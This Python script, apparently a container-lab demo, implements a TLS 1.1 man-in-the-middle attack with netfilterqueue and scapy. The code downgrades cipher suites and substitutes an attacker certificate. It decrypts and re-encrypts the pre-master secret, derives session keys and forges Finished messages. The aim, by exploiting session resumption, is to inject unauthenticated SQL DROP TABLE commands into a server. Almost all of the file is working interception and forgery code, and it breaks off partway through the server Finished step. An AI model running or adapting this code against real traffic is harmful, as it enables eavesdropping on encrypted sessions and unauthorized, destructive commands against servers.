# This is a sample Python script.
# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import http.client
import socket
import subprocess
from time import sleep

import netfilterqueue
import scapy.layers.inet
import tlslite
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives.ciphers.algorithms import AES256
from cryptography.hazmat.primitives.ciphers.base import Cipher as CipherBase
from cryptography.hazmat.primitives.ciphers.modes import CBC
from cryptography.hazmat.primitives.hmac import HMAC
from cryptography.x509 import load_pem_x509_certificate
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.tls.crypto.prf import _tls_PRF
from scapy.layers.tls.handshake import TLSClientHello
from scapy.layers.tls.record import *
from scapy.main import load_layer
from scapy.packet import Packet
from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker, Session
from tlslite.utils.compat import bytes_to_int

# We got a server and a client. The server accepts "database" commands from clients: if they are anything but drop table commands, it accepts
# them because they are innocuous, but if they are DROP TABLE commands, it requests a certificate from the client before executing them.
#
# tlslite-ng doesn't support renegotiation, so the "client certificate request" is not implemented, but we still simulate a session resumption
# and look with wireshark if the resumption successfully completes even though the client and server saw different handshake (and hence saw
# different client_finished and server_finished messages' verify data fields) messages.
#
# the attack premises are that the client speaks to us "voluntarily", in the sense that it accepts our certificate in some way
# (we could've stolen it from a legitimate server or the client merely doesn't care about it).
# This is rather a strong assumption, but nonetheless, the key point of this attack is not to trick the client, but trick the
# server into executing our malicious SQL commands!
#
# The objective is to negotiate the same session ID and same master key (Which are parameters used in the session resumption handshake)
# so that we (as the attacker) can send unauthenticated data to the server,
# truncate the connection when  the server asks for client auth, and then, when the client and server
# resume the session, they will resume the session through the resume session handshake (which is vulnerable because it's not tied
# to the previous messages) and since we made them negotiate the same parameters, the handshake will complete (this time with the
# real client signing the finished messages!) and our previously unauthenticated sent data will be instead treated as authenticated
# (mind you, the client doesn't even know we sent that!).

TLS_VERSION = (3,2) # 3,2 For tls 1.1, 3,3 for tls 1.2, 3,4 for tls 1.3 (watchout, you might need ecdsa, might not work with rsa... it gives missing supported group error...)

#according to RFC 4346 section 7.4.9 "Finished"
#this one will be the concatenation of handshake messages to be sent to the server (remember, we are modifying packets when we forward them, OTHERWISE HANDSHAKE FAILS AND WE GET DISCOVERED!)
client_finished_concatenation = b'' # we need to save (only the handshake parts, stripped off the 5 bytes "TLS" Headers) and concatenate
                                 # client hello, server hello, certificate (the one sent with the server hello TCP segment), server hello done
                                 # client key exchange (changecipherspec is NOT included cause it's not of type of "handshake")
                                 # to later
                                 #  (1) hash them through the TLS p_hash function,
                                 #  compute PRF of (computed_master_key, "client finished", hash) to obtain a 12 bytes hash
                                 # append header 0x1400000C (FIRST 2 bytes are TLS message type and last 3 are size in bytes, 0xC so 12 bytes!)
                                 # encrypt the total message "header | hash" using the pre-defined AES 256 CBC block cipher
                                 # send the cyphertext
                                 # NOTE: |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
                                 #       VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
                                 # PRF(bytes_string) for TLS 1.1 is a concatenation of MD5.digest(bytes_string) and SHA1.digest(bytes_string)
                                 # for TLS1.2 It's the same hash of the current session's chosen cipher, likely SHA256 as it's the most common
server_finished_concatenation = b'' # this one will be the concatenation of the handshake messages to be sent to the client


from scapy.layers.tls.crypto.prf import PRF

tls_1_1_prf = PRF(tls_version=0x0302) # for TLS 1.1, this will select PRF of TLS 1.1 which is a concatenation of KEYED MD5 and SHA1 as described in section 5 of RFC 4346

# Data to be remembered through various NETFILTER_QUEUES callback's calls of handler_queue_1()
# we keep it global, we never know if some other function needs it...
client_random = b''
server_random = b''
pre_master_key = b''
computed_master_key = b''

client_write_MAC_secret = b''
server_write_MAC_secret = b''
client_write_key = b''
server_write_key = b''
client_write_IV = b''
server_write_IV = b''

def get_handshake_message_bytes(tls_record: Packet):
    """ Helper function to isolate the payload of handshake messages from its header... useful since for the calculation of
    verify_data we just need the payload of all handshake messages."""

    # there may be more TLS records stacked in the TCP payload, especially after this tls_record... first isolate the latter...
    temp2 = tls_record.copy() # this gets the current tls record and next ones too... we do a Python object deepcopy to not alter the original outside this function

    if not isinstance(tls_record, TLS):
        print("Error! Packet passed to get_handshake_message_bytes is not a TLS record!")
        exit(-1)

    #todo: maybe we can spare some computational time by removing the "excluding" code? It's bounded anyways now

    # haslayer is influenced by stacked TLS records which in many cases can be found after the present TLS record.
    # so we use the following lines of code...
    temp2.remove_parent(None)
    temp2.remove_underlayer(None)
    temp2.remove_payload()  # this is the key one
    # ... to exclude them!
    #print("Extracted handshake message, length of " + str(temp2.len ) + " bytes")

    return bytes(temp2)[5:] # we exclude the first 5 bytes (0..4) cause they are the header, and those SHOULD NOT be included in the digest for the verify_data field...


def TLS_record_contains_message_of_type(tls_record: Packet, packet_cls):
    """ Helper function that makes sure the check of Scapy's haslayer() method stops at the current tls record, and doesn't check into subsequent stacked TLS records!
    In fact, for some reason, in the TLS records' Scapy layer POVs are included even subsequent TLS records stacked after it!
    """

    # we got to deepcopy first, to not alter the original
    temp2 = tls_record.copy()

    #haslayer is influenced by stacked TLS records which in many cases can be found after the present TLS record.
    # so we use the following lines of code...
    temp2.remove_parent(None)
    temp2.remove_underlayer(None)
    temp2.remove_payload() # this is the key one
    #... to exclude them!

    #now we can use the haslayer function safely, without it going out of the current TLS record boundaries in search
    # for the searched layer!

    return temp2.haslayer(packet_cls)


def count_TLS_nested_layers(pkt: Packet):
    """ Helper function that counts the number of TLS records in a packet. Remember: TLS records encapsulate TLS messages! (under a header)"""
    count = 0
    temp = pkt.copy()
    more = False

    if temp.haslayer(TLS): # unbounded layer search, pkt may be IP/TCP/... or TCP/ or some other type of packet in which TLS may be found at really deep levels in the network stack!
        temp = temp.getlayer(TLS, 1) # this get the first TLS record it encounters after the current pkt layer
                                     # let's say the packet is IP/TCP/TLS,TLS,TLS,TLS
                                     # It will pick up the first TLS, in a single scapy "TLS(*),TLS,TLS,TLS" object,
                                     # and if you try to access his fields with temp.field
                                     # you will be accessing the first TLS record's fields (*)...
                                     # problem is when you do temp = temp.getlayer(TLS, 1) another time!
                                     # you will just pick up the first TLS(*) again! So to advance you need to do getLayer(TLS, 2) instead!
                                     # not only that! watchout if you use haslayer to check if a TLS record contains some kind of message (like clientHello)!
                                     # it seems that haslayer looks even sublayers (other TLS records stacked after the current one!!!)
        more = True

    while more:

        # (uncomment the exit 0 line too, so results can be seen faster)
        #print(temp.show2()) # as you will see if you uncomment this print, you will see that each temp packet maintains the substrate layers too,
                            # so you will see printed the current TLS record and the remaining (stacked) ones
        # while if you uncomment this print, you'll see that by using these lines of code you can isolate the
        # TLS records from each other! THIS WAY THE CHECK "HASLAYER" WILL NOT GO BEYOND THE CURRENT LAYER.
        # I had in fact a problem, while using haslayer, in previous commits...
        # It searched even in sublayers!!! so i could not know if i was looking inside a certain type of record!
        #print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        #temp2 = temp.copy()
        #temp2.remove_parent(None)
        #temp2.remove_underlayer(None)
        #temp2.remove_payload()
        #print(temp2.show2())
        #print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")

        temp = temp.getlayer(TLS, 2) # with 2, since temp it's already a TLS record, we'll advance forward in the stacking

        if temp is not None: # if we reach the end, temp will be none
            more = temp.haslayer(TLS)
        else:
            more = False

        count += 1

    print("Found " + str(count) + " TLS records in this packet.")
    #exit(0)
    return count

handshake_mangled= False
applicationdata_mangled = False
session_resumed = False

def handler_queue_1(pkt: netfilterqueue.Packet):
    """ This is the function that the netfilter's kernel module will call when one of its iptables' filters capture a packet!
    This function enacts the attack on behalf of the attacker!"""

    # lots of information to remember between netfilter calls...
    global client_finished_concatenation
    global server_finished_concatenation
    global client_random
    global server_random
    global pre_master_key
    global tls_1_1_prf
    global computed_master_key

    global client_write_MAC_secret
    global server_write_MAC_secret
    global client_write_key
    global server_write_key
    global client_write_IV
    global server_write_IV

    global hashes

    global handshake_mangled
    global applicationdata_mangled
    global session_resumed

    # just a counter to show the index of the most recent netfilter_queues packet...
    handler_queue_1.pktnum += 1
    print(f"{handler_queue_1.pktnum}) received " + pkt.__str__())

    # PDU = Packet data unit, IP header + IP content!
    # remember, IP packet may be fragmented, but we may be lucky and content may be all inside a single IP packet (as it happens during this DEMO)!
    l3_PDU = pkt.get_payload() # starts with the IP header, continues with the contents (matrioska, TCP is inside IP payload)
    scpy_pkt = IP(l3_PDU)

    if scpy_pkt.haslayer(TLS):
        print("TLS record received in current packet")
        #scpy_pkt.show2() # uncomment if you want to print it... but all the subsequent prints already print what you really need to see...

        if not handshake_mangled:
            # does the current packet contain a client_hello? Then it must be the first stage of the TLS handshake!
            if scpy_pkt.haslayer("TLSClientHello"): # first packet of TLS handshake, should be only this one!
                #todo: add support code in case TLSClientHello is not the only handshake message in the first TCP message

                # gotta modify the tls client hello to remove too secure cipher suites!
                # IN our case, we want the client to use only RSA with AES 256_CBC_SHA since he tries to use Ephemeral DIffie hellman instead...
                # so we intercept the packet and replace the Ephemeral choice with AES_128 version of the target cipher suite: this way
                # we don't have to worry about intercepting the server hello (next TCP segment, a syn/ack to the CLient Hello) to
                # modify its TCP ACK number!
                print("--------------------------------------------------------------------------------")
                print("--------------------------------------------------------------------------------")
                print("--------------------------------------------------------------------------------")
                print("TLS client hello captured")
                scpy_pkt.show2()
                print("--------------------------------------------------------------------------------")
                print("--------------------------------------------------------------------------------")
                print("--------------------------------------------------------------------------------")

                tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])


                # for the concatenation of the attacker acting as a server to the client, we take it before modifications
                print(f"(server concat) client hello length: " + str(len(bytes(tlsmsg))))
                server_finished_concatenation += bytes(tlsmsg)

                #random bytes
                client_random = bytes(tlsmsg)[6:38] # tlsmsg.gmtunixtime is bugged, can't concatenate it to the other 28 byte random field through Scapy's interface,
                                                    # I need to access the bytes of both directly!
                print("client_random: " + client_random.hex()) # to check if it is the same as in the show2() output

                #ignore the commented out code, it was written as an attempt to try to make the attack work by dropping (not overwriting)
                # i'll leave it here in case you want to implement that case too...

                # the unwanted cipher suites's labels to be inserted into the packet
                from scapy.layers.tls.crypto.suites import TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA
                tlsmsg.ciphers = [0X00FF,TLS_RSA_WITH_AES_128_CBC_SHA ,TLS_RSA_WITH_AES_256_CBC_SHA]
                #tlsmsg.cipherslen = None # By setting it to none, it will rebuild during show2
                #tlsmsg.msglen = None # By setting it to none, it will rebuild during show2

                #print(tlsmsg.show2())

                #scpy_pkt["TCP"].remove_payload()
                #scpy_pkt /= tlsmsg # reattach tls...
                #del scpy_pkt["TLS"].len #got to set to none these layer's len and chksums too...
                del scpy_pkt["TCP"].chksum
                #del scpy_pkt["IP"].len
                del scpy_pkt["IP"].chksum
                #del scpy_pkt["IP"].dataofs

                #print(scpy_pkt["TCP"].show2())
                #print(scpy_pkt["IP"].show2())
                print(scpy_pkt.show2()) #rebuild the checksums (and lengths, if you uncommented them) and prints the packet... show2 returns a printable string...

                #after rebuilding with show2(), we must get the tlsmsg again before concatenating its contents for verify_data...
                tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])

                pkt.set_payload(bytes(scpy_pkt))
                print(f"(client concat) client hello length: " + str(len(bytes(tlsmsg))))
                # for the concatenation of the attacker acting as a client to the server, we take it after we modified them
                client_finished_concatenation += bytes(tlsmsg)

            elif scpy_pkt.haslayer("TLSServerHello"): #second stage of the TLS handshake, if inside this packet there is at least TLSServerHello (Note: many more TLS records may be inside this packet!)...
                # we must forward it as it is, but modify serverCertificate. which we must instead modify.

                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
                print("TLS server hello captured")
                scpy_pkt.show2()
                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
                print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")

                #how many TLS records are stacked in this message?
                n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"]) # don't count TCP layer...
                print("n_tls_records: " + str(n_tls_records))


                # check each one
                # remember, for TLS 1.1 It is not legal to send the server key exchange message for the RSA method (RFC 4346 page 42), so
                # we don't have to deal with it!
                for i in range(1, n_tls_records + 1):
                    # we use getlayer and i to get the packet... since we using scpy_pkt[TLS],
                    # this will get us the first record found right after the TCP layer. with i = 1 we will get the first TLS record, with i=2 the second TLS record and so on
                    generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i) # each TLS message is wrapped inside a generic TLS layer,
                                                                        # which has a type, a version, a len and an iv field...
                    print(f"checking record {i}")
                    # we received a message from the legitimate server. The legitimate (unchanged message) will be useful for
                    # when we calculate/modify the finished message of the client, so when we (attacker) act as a client
                    # to the server
                    client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                    print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))


                    if TLS_record_contains_message_of_type(generic_tls_layer, scapy.layers.tls.handshake.TLSCertificate):
                        # ok we'll change this one...
                        # the other possible layers are
                        # server hello (forward as it is, contains session id),
                        # and server hello done (forward as it is)

                        #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers

                        scpy_tls_cert = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate)

                        # the attacker server certificate is 819 bytes long. the server real certificate is 853 bytes long
                        attacker_certificate_der = open("/app/attacker_server_certificate.der", "rb").read()
                        attacker_certificate_der_len = len(attacker_certificate_der)
                        print(f"attacker certificate length is {attacker_certificate_der_len}")

                        server_certificate_der = open("/app/server_certificate.der", "rb").read()
                        server_certificate_der_len = len(server_certificate_der)

                        # since the difference in length is positive in the demo, we can just pad with zeroes... (btw, i calculated it manually using cyberchef)
                        # todo: what if negative difference? Then the only way is to actively modify seq fields (or make a shorter certificate by leaving some field empty, like country, state... but not common name)!
                        attacker_certificate_der_padded = attacker_certificate_der + b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
                        attacker_certificate_der_padded_len = len(attacker_certificate_der_padded)

                        scpy_tls_cert.certs = [(attacker_certificate_der_padded_len, attacker_certificate_der_padded)]

                        #commented out code is from when i was trying to deal with it without padding
                        #scpy_tls_cert.certslen = None
                        #scpy_tls_cert.msglen = None

                        # generic_tls_layer is the parent of scpy_tls_cert
                        #generic_tls_layer.len = None
                        #generic_tls_layer.padlen = server_certificate_der_len - attacker_certificate_der_len
                        #generic_tls_layer.pad = b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
                        #generic_tls_layer.build_padding()
                        print("------------------------------------------")
                        print("------------------------------------------")
                        print("------------------------------------------")
                        print("------------------------------------------")
                        print(scpy_tls_cert.show2())
                        print("------------------------------------------")
                        del scpy_pkt["TCP"].chksum
                        del scpy_pkt["IP"].chksum
                        del scpy_pkt["IP"].len
                        print(scpy_pkt.show2())
                        print("------------------------------------------")
                        print("------------------------------------------")
                        print("------------------------------------------")
                        print("------------------------------------------")


                    elif TLS_record_contains_message_of_type(generic_tls_layer, "TLSServerHello"):
                        #get the server random
                        server_hello_msg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSServerHello)
                        server_random = bytes(server_hello_msg)[6:38]
                        print(
                            "server_random: " + server_random.hex())  # to check if it is the same as in the show2() output

                    # we received a message from the legitimate server. The illegitimate (CHANGED message) will be useful for
                    # when we calculate/modify the finished message of the Server, so when we (attacker) act as a server
                    # to the client
                    scpy_pkt.show2()
                    # after rebuilding with show2(), we must get the generic_tls_layer again before concatenating it...
                    generic_tls_layer = scpy_pkt[TLS].getlayer(TLS, i)
                    server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                    print(f"(server concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))
                    # todo: perchè è None la length della print del get_handshake_message_bytes? controlla anche gli altri posti...

                print(len(bytes(scpy_pkt)))
                pkt.set_payload(bytes(scpy_pkt))

            elif scpy_pkt.haslayer(scapy.layers.tls.handshake.TLSClientKeyExchange):
                # third stage of the handshake, got to modify the encrypted pre-master secret with the public key of the server
                # remember: the previous message modified the packet and sent the attacker's certificate, so what we receive
                # is encrypted with the attacker's public key!
                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
                print("TLS client key exchange captured")
                scpy_pkt.show2()
                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")
                print("33333333333333333333333333333333333333333333333333333333333333333333333333333333")

                # how many TLS records are stacked in this message?
                n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"])  # don't count TCP layer...
                print("n_tls_records: " + str(n_tls_records))

                tls_record_of_finished_message = -1

                change_cipher_spec_encountered = False # as per rfc section 7.4.9 start, after we encounter a CCS message, we expect not encountering
                                                       # handshake messages encapsulated in TLS frames anymore FROM THE SENDER OF THE CCS, so we can stop
                                                       # concatenating them inside the relative concatenation strings...

                #pick the key exchange message...
                for i in range(1, n_tls_records + 1):
                    generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i) # each TLS message is wrapped inside a generic TLS layer,
                                                                        # which has a type, a version and a len field...


                    if TLS_record_contains_message_of_type(generic_tls_layer, scapy.layers.tls.handshake.TLSClientKeyExchange):

                        scpy_tls_clientExchg = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSClientKeyExchange)

                        scpy_pkt.show2() # we just rebuild the scapy_pkt in case it changed

                        # for the server finished message we take the TLS record's content BEFORE changing them
                        server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                        print(f"(server concat)generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))

                        # no need to change the msglen, it will be the same when we re-encrypt...
                        # decrypt... so... the exchkeys field is composed of the length of the ciphertext (2 bytes), and the ciphertext containing the premasterkey encrypted via RSA PKCS v1.5
                        encrypted_pre_master_key_length__client = bytes(scpy_tls_clientExchg.exchkeys)[0:2]
                        print("encrypted_pre_master_key_length: " + str(bytes_to_int(encrypted_pre_master_key_length__client)))
                        encrypted_pre_master_key__client = bytes(scpy_tls_clientExchg.exchkeys)[2:] # remove the first two bytes, they are the pre master length
                        print(encrypted_pre_master_key__client)
                        print("confirm with encrypted_pre_master_key__client string length: " + str(len(encrypted_pre_master_key__client)))

                        with open("/app/RSA_key_attacker_server.pem", "rb") as key_file:
                            private_key_attacker_s = serialization.load_pem_private_key(key_file.read(), password=None)

                        pre_master_key = private_key_attacker_s.decrypt(encrypted_pre_master_key__client, padding=PKCS1v15())

                        print("Plaintext pre master key should be 48 bytes long, 2 for the version, 46 for the random number")
                        print("length: " + str(len(pre_master_key)))
                        print("plaintext: " + str(pre_master_key))
                        print("plaintext (HEX): " + pre_master_key.hex())

                        #reencrypt with the server's public key and send it like that...
                        with open("/app/server_certificate.pem", "rb") as pub_cert_file_server:
                            public_key_server = load_pem_x509_certificate(pub_cert_file_server.read()).public_key()

                        encrypted_pre_master_key__server = public_key_server.encrypt(pre_master_key, PKCS1v15())

                        # substitute the bytes of the pre master secret in the original packet with those here...
                        scpy_tls_clientExchg.exchkeys = encrypted_pre_master_key_length__client + encrypted_pre_master_key__server

                        print(len(encrypted_pre_master_key_length__client + encrypted_pre_master_key__server))
                        print("vvvvvvvvvvvvvvvvvvvvvvvv New exchange vvvvvvvvvvvvvvvvvvvvvvvv")
                        print(scpy_pkt.show2())

                        # for the client finished message we take the TLS record's content AFTER changing it
                        generic_tls_layer = scpy_pkt[TLS].getlayer("TLS", i)
                        client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                        print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))

                    elif TLS_record_contains_message_of_type(generic_tls_layer, TLSChangeCipherSpec):
                        # we MUST NOT count this TLS record in the concatenation!
                        print("CHANGE CIPHER SPEC!!!! IGNORING!!!!")
                        change_cipher_spec_encountered = True

                        tls_record_of_finished_message = i + 1
                    else:
                        print("Check if this message was the last unknown, in that case this is an encrypted client finished message...")
                        print("Unknown TLS layer type encountered before change cipher spec...")
                        if not change_cipher_spec_encountered:
                            print("Still, we are saving it inside the concatenation...") # we should not enter here if everything is correct and you are using tls 1.1 ...

                            scpy_pkt.show2()
                            # for the server finished message we take the TLS record's content BEFORE changing them
                            server_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                            print(f"(server concat)generic tls layer {i} length: " + str(
                                len(get_handshake_message_bytes(generic_tls_layer))))

                            # for the client finished message we take the TLS record's content AFTER changing it
                            client_finished_concatenation += get_handshake_message_bytes(generic_tls_layer)
                            print(f"(client concat) generic tls layer {i} length: " + str(len(get_handshake_message_bytes(generic_tls_layer))))

                        print("TLS client finished message captured? check if the numbers are the same")
                        print(f"Calculated tls record number: {i}; Actual tls record number: {tls_record_of_finished_message}")


                # ok after all of this, we need to change the finished message...
                if tls_record_of_finished_message == -1:
                    print("We didn't capture the finished message, aborting")
                    exit(0)

                generic_tls_layer = scpy_pkt["TLS"].getlayer("TLS", tls_record_of_finished_message)
                print(".....................................")
                print(type(generic_tls_layer)) # print the object and maybe the class type
                print(generic_tls_layer.__dict__)
                print(generic_tls_layer.show())
                print(".....................................")
                payload = bytes(generic_tls_layer)
                print(payload)
                print(".....................................")
                print(client_finished_concatenation)
                print(server_finished_concatenation)
                print(len(client_finished_concatenation))
                print(len(server_finished_concatenation))
                print(".....................................")

                #let's calculate the secret and keying material!
                computed_master_key = tls_1_1_prf.compute_master_secret(pre_master_key, client_random, server_random)
                print(f"MASTER SECRET (len:{len(computed_master_key)}): " + str(computed_master_key))
                print(f"Master secret (hex): {computed_master_key.hex()}")

                # AES_256_CBC_SHA needs 2x32 bytes keys, 2x20 byte mac secrets and 2x16 byte initialization vectors,
                # for a total of 136 bytes of material (RFC 4346 sec. 6.3)
                key_block = _tls_PRF(computed_master_key, b'key expansion', server_random + client_random, 136)
                client_write_MAC_secret = key_block[0:20]
                server_write_MAC_secret = key_block[20:40]
                client_write_key = key_block[40:72]
                server_write_key = key_block[72:104]
                client_write_IV = key_block[104:120]
                server_write_IV = key_block[120:136]

                # before changing the finished message, get it from the client, cause we need to concat it to the server one...
                iv = (bytes(scpy_pkt)[-64:])[
                    0:16]  # take the first 16 bytes of the client finished, that's the IV used by the real client to encrypt the finished message...
                print(b"iv used by the client: " + iv)
                print("iv used by the client (hex): " + iv.hex())

                cipher_decrypt = CipherBase(AES256(client_write_key), CBC(iv))
                decryptor = cipher_decrypt.decryptor()
                decrypted_client_finished = decryptor.update((bytes(scpy_pkt)[-64:])) + decryptor.finalize()
                decrypted_client_finished_only_handshake_message = decrypted_client_finished[16:32]

                server_finished_concatenation += decrypted_client_finished_only_handshake_message
                print(
                    f"(server concat) unencrypted client finished of {len(decrypted_client_finished_only_handshake_message)} bytes: " + str(
                        decrypted_client_finished_only_handshake_message))

                #now the 12 byte verify field
                new_verify_field = tls_1_1_prf.compute_verify_data("client", "write", client_finished_concatenation, computed_master_key)
                print(f"Computed verify... " + str(new_verify_field))

                #we need to append initially the following 4 bytes, 1 for the type, 3 for the length
                # appendix A.4 and A 4.4 RFC 4346 (FInished message)
                # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
                # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
                # "fragment"
                temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)


                # LET'S ENCRYPT!

                #so, the temp_pre_encryption is a Handshake struct ok? Now... that struct gets put in a TLS Plaintext struct as
                # the "opaque fragment" field. This TLSPlaintext becomes a TLSCompressed struct (via CompressionMethod.null, which
                # doesn't change it, effectively fragment of this new TLSCOmpressed is the same as the old one). THis TLSCompressed
                # becomes a TLSCiphertext struct, which you can see an example (original packet) printed in the screenshot in the app folder...
                # we printed it via the print(....show2()) function

                #anyways... we need to create the "raw" field that you can see in the screenshot, which is the fragment of the TLSCIphertext,
                # when case block is chosen... so we follow the construction of GenericBlockCIpher!

                # RECIPE FOR THE MAC!
                # sequence number at 0 for handshake messages (8 bytes)
                # 1 byte content type at 0x16 for handshake messages
                # tls version (0x0302 for tls 1.1)
                # 2 bytes plaintext length (16 for the temp_pre_encryption bytestring)
                # plaintext (temp_pre_encryption)
                intermediary_plaintext = b'\x00'*8 + b'\x16' + b'\x03\x02' + b'\x00\x10' + temp_pre_encryption

                h = HMAC(client_write_MAC_secret, hashes.SHA1())
                h.update(intermediary_plaintext)
                signature = h.finalize() # MAC[CipherSpec.hash_size] = MAC[20 BYTES]
                print(b"Signature: " + signature)

                # RECIPE FOR GenericBlockCipher
                # IV [16 bytes]
                # content (intermediary_plaintext) [16 bytes]
                # MAC [20 bytes]
                # padding (must be a multiple of 16 bytes, the block length of our AES256 cipher, so with 53 as the sum of IV, content and MAC and padding length, we need 11 padding bytes, and the padding bytes will be b'0x0B')
                # padding length 1

                cipher = CipherBase(AES256(client_write_key), CBC(client_write_IV))
                encryptor = cipher.encryptor()
                plaintext = temp_pre_encryption + signature # only these two as the plaintext, choose a random IV and prepend it after you encrypt this plaintext...

                padding_length = 16 - (len(plaintext) % 16)
                if padding_length == 0:
                    padding_length = 16
                padding = (chr(padding_length - 1) * padding_length).encode()

                plaintext += padding

                print(b"plaintext: " + plaintext)
                print("padded plaintext length: " + str(len(plaintext)))

                ct = encryptor.update(plaintext) + encryptor.finalize()

                #final payload will be IV and ct concatenated!
                # according to section 6.2.3.2 of RFC 4346 and my tests, i found out that IV gets prepended to the ciphertext, before
                # getting sent... there is even another option, which is to set the "cipher" IV to 0 and encrypt "our" IV by prepending it to the ciphertext, like the
                # one calculated in the KDF, as the FIRST block, then just send the ciphertext (WITHOUT PREPENDING THE "cipher" IV to the ciphertext) (option 2.a page 22 rfc 4346)
                # In either way, it seems that the tlslite-ng implementation uses the first option and generates the IV separately
                # for each Record, as per point 1 of page 22 of RFC 4346 (look session.py "derive_keys" of that library!)...
                ct = client_write_IV + ct # prepend the "random" IV... who cares if we don't generate it as per RFC... WE'RE THE ATTACKERS!

                print(b"Ciphertext: " + ct)
                print("Ciphertext length: " + str(len(ct)))

                print(scpy_pkt.show2())

                final_packet_after_manual_insertion = IP(bytes(scpy_pkt)[0:-(len(ct))] + ct)

                del final_packet_after_manual_insertion["TCP"].chksum
                del final_packet_after_manual_insertion["IP"].chksum
                del final_packet_after_manual_insertion["IP"].len
                print(final_packet_after_manual_insertion.show2())


                pkt.set_payload(bytes(final_packet_after_manual_insertion))

            elif scpy_pkt.haslayer(TLSChangeCipherSpec) and scpy_pkt.src == "172.18.0.3": # SERVER CHANGE CIPHER AND SERVER'S Finished message!
                # fourth and final stage of the handshake, got to modify the TLS server finished message and inject an unauthenticated command!
                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
                print("TLS server change cipher spec captured")
                scpy_pkt.show2()
                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")
                print("44444444444444444444444444444444444444444444444444444444444444444444444444444444")

                # how many TLS records are stacked in this message?
                n_tls_records = count_TLS_nested_layers(scpy_pkt["TCP"])  # don't count TCP layer...
                print("n_tls_records: " + str(n_tls_records))

                tls_record_of_finished_message = -1

                change_cipher_spec_encountered = False  # as per rfc section 7.4.9 start, we expect not encountering any more
                                                        # handshake messages encapsulated in TLS frames, so we can stop
                                                        # concatenating them inside the relative concatenation strings

                # pick the key exchange message...
                for i in range(1, n_tls_records + 1):
                    generic_tls_layer = scpy_pkt[TLS].getlayer("TLS",
                                                               i)  # each TLS message is wrapped inside a generic TLS layer,
                    # which has a type, a version, a len and an iv field...

                    if TLS_record_contains_message_of_type(generic_tls_layer,
                                                           TLSChangeCipherSpec):
                        print("SERVER CHANGE CIPHER SPEC!!!! IGNORING!!!!")
                        change_cipher_spec_encountered = True

                        tls_record_of_finished_message = i + 1
                    elif i == tls_record_of_finished_message: # handshake message containing an encrypted message
                        # ok, like in the third step, but this time from the server's perspective!
                        print("Server finished message, we need to stop taking into consideration any more TLS records...")

                        # now the 12 byte verify field
                        new_verify_field = tls_1_1_prf.compute_verify_data("server", "write", server_finished_concatenation,
                                                                           computed_master_key)

                        print(f"Computed verify... " + str(new_verify_field))

                        # we need to append initially the following 4 bytes, 1 for the type, 3 for the length
                        # appendix A.4 and A 4.4 RFC 4346 (FInished message)
                        # first off, we need to create an intermediary plaintext ( this is the same as section 6.2.2, 6.2.1 RFC 4346,
                        # TLSPlaintext and TLSCompressed since compression is off): this is effectively an Handshake message which goes as a
                        # "fragment"
                        temp_pre_encryption = b'\x14\x00\x00\x0C' + new_verify_field  # Handshake header and Finished field, handshake type = 0x16 or 20 decimal ("finished" HandshakeType)

                        # LET'S ENCRYPT!

                        # RECIPE FOR THE MAC!
                        # sequence number at 0 for handshake messages (8 bytes) (this is the first for the server "end"!!!!)
                        # 1 byte content type at 0x16 for handshake messages
